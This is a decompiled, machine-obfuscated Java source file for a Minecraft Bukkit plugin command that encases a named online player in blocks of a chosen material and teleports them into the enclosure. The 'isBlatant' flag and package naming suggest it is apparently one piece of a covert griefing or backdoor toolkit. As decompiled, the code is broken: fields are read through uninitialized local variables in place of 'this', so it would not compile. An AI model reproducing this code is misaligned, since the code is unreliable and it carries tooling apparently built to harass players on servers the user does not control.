/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Location
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class TrapCommand
extends Command {
    private /* synthetic */ Material trapMaterial;

    @Override
    public void execute(Core llllllllllllllIIllIlIIlIIIIlllII, String llllllllllllllIIllIlIIlIIIlIIIII, String[] llllllllllllllIIllIlIIlIIIIlllll, Player llllllllllllllIIllIlIIlIIIIllIlI) {
        if (llllllllllllllIIllIlIIlIIIIlllll.length <= 1) {
            llllllllllllllIIllIlIIlIIIIllIlI.sendMessage(Settings.USAGE("Trap <player> <block>"));
        } else if (llllllllllllllIIllIlIIlIIIIlllll.length == 3) {
            Player llllllllllllllIIllIlIIlIIIlIIIll = Bukkit.getServer().getPlayer(llllllllllllllIIllIlIIlIIIIlllll[1]);
            if (llllllllllllllIIllIlIIlIIIlIIIll == null) {
                llllllllllllllIIllIlIIlIIIIllIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIllIlIIlIIIIlllll[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                TrapCommand llllllllllllllIIllIlIIlIIIIlllIl;
                Location llllllllllllllIIllIlIIlIIIlIlllI = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(0, -1, 0).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIllIl = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(0, 2, 0).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIllII = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(-1, 0, 0).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIlIll = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(1, 0, 0).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIlIlI = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(-1, 1, 0).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIlIIl = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(1, 1, 0).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIlIII = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(0, 0, -1).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIIlll = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(0, 0, 1).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIIllI = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(0, 1, -1).getLocation();
                Location llllllllllllllIIllIlIIlIIIlIIlIl = llllllllllllllIIllIlIIlIIIlIIIll.getLocation().getBlock().getRelative(0, 1, 1).getLocation();
                try {
                    llllllllllllllIIllIlIIlIIIIlllIl.trapMaterial = Material.valueOf((String)llllllllllllllIIllIlIIlIIIIlllll[2].toUpperCase());
                }
                catch (IllegalArgumentException llllllllllllllIIllIlIIlIIIlIllll) {
                    llllllllllllllIIllIlIIlIIIIllIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The block ").append(Settings.RED).append(llllllllllllllIIllIlIIlIIIIlllll[2]).append(Settings.WHITE).append(" was not found!"))));
                    return;
                }
                llllllllllllllIIllIlIIlIIIIllIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Trapped ").append(Settings.RED).append(llllllllllllllIIllIlIIlIIIlIIIll.getName()))));
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIlllIIllII;
                    llllllllllllllIIllIlIIlIIIlIlllI.getBlock().setType(llllllllllllllIIllIlIIIlllIIllII.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIlllIlIIlI;
                    llllllllllllllIIllIlIIlIIIlIllIl.getBlock().setType(llllllllllllllIIllIlIIIlllIlIIlI.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIlllIllIlI;
                    llllllllllllllIIllIlIIlIIIlIllII.getBlock().setType(llllllllllllllIIllIlIIIlllIllIlI.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIllllIIIII;
                    llllllllllllllIIllIlIIlIIIlIlIll.getBlock().setType(llllllllllllllIIllIlIIIllllIIIII.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIllllIIllI;
                    llllllllllllllIIllIlIIlIIIlIlIlI.getBlock().setType(llllllllllllllIIllIlIIIllllIIllI.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIllllIlIlI;
                    llllllllllllllIIllIlIIlIIIlIlIIl.getBlock().setType(llllllllllllllIIllIlIIIllllIlIlI.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIlllllIIII;
                    llllllllllllllIIllIlIIlIIIlIlIII.getBlock().setType(llllllllllllllIIllIlIIIlllllIIII.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIllllllIII;
                    llllllllllllllIIllIlIIlIIIlIIlll.getBlock().setType(llllllllllllllIIllIlIIIllllllIII.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIIlllllllII;
                    llllllllllllllIIllIlIIlIIIlIIllI.getBlock().setType(llllllllllllllIIllIlIIIlllllllII.trapMaterial);
                });
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> {
                    TrapCommand llllllllllllllIIllIlIIlIIIIIIlII;
                    llllllllllllllIIllIlIIlIIIlIIlIl.getBlock().setType(llllllllllllllIIllIlIIlIIIIIIlII.trapMaterial);
                });
                Location llllllllllllllIIllIlIIlIIIlIIlII = llllllllllllllIIllIlIIlIIIlIlllI.getBlock().getRelative(0, 1, 0).getLocation();
                llllllllllllllIIllIlIIlIIIlIIlII.setX((double)llllllllllllllIIllIlIIlIIIlIlllI.getBlockX() + 0.5);
                llllllllllllllIIllIlIIlIIIlIIlII.setZ((double)llllllllllllllIIllIlIIlIIIlIlllI.getBlockZ() + 0.5);
                Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIlIIlIIIIlllII, () -> llllllllllllllIIllIlIIlIIIlIIIll.teleport(llllllllllllllIIllIlIIlIIIlIIlII));
            }
        } else {
            llllllllllllllIIllIlIIlIIIIllIlI.sendMessage(Settings.USAGE("Trap <player> <block>"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public TrapCommand() {
        TrapCommand llllllllllllllIIllIlIIlIIlIIIIII;
    }
}

